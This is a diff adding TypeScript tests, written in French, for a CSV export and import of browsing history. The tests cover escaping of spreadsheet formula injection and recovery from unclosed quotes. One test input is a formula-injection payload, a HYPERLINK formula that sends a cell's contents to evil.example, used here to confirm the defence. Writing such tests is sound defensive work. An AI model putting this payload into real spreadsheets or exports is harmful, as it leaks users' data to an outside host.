@@ -48,3 +48,24 @@ describe('CSV de l’historique', () => {
     expect(tailles).toEqual([5000, 5000, 2000])
   })
 })
+
+describe('CSV : formules et lignes démesurées', () => {
+  it('un titre qui commence par =, +, -, @, tabulation ou retour chariot sort préfixé de « \' » et revient à l’identique', async () => {
+    const piege = '=HYPERLINK("http://evil.example/?x="&A1,"clic")'
+    expect(ligneCsv(v('https://a.fr/', piege, 0))).toBe(`1970-01-01T00:00:00.000Z,"'=HYPERLINK(""http://evil.example/?x=""&A1,""clic"")",https://a.fr/,1`)
+    const titres = ['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx', piege, "'=déjà", "'normal", 'a=b']
+    const src = titres.map((t, i) => v(`https://h${i}.fr/`, t, 1_700_000_000_000 + i))
+    const csv = [ENTETE_CSV, ...src.map(ligneCsv)].join('\r\n') + '\r\n'
+    expect(csv).not.toMatch(/,=|,\+|,-1|,@|,"=/)
+    expect(await lire(csv, 5)).toEqual(src)
+  })
+
+  it('un guillemet jamais refermé : la ligne est ignorée et comptée, l’analyse reprend à la ligne suivante', async () => {
+    const csv = `${ENTETE_CSV}\n2026-01-02T00:00:00.000Z,"abc${'x'.repeat(200_000)}\n2026-01-02T00:00:00.000Z,B,https://b.fr/,1\n`
+    let ignorees = 0
+    const sortie: Visite[] = []
+    for await (const lot of lotsDepuisCsv(morceaux(csv, 4096), () => ignorees++)) sortie.push(...lot)
+    expect(ignorees).toBe(1)
+    expect(sortie.map((x) => x.url)).toEqual(['https://b.fr/'])
+  })
+})
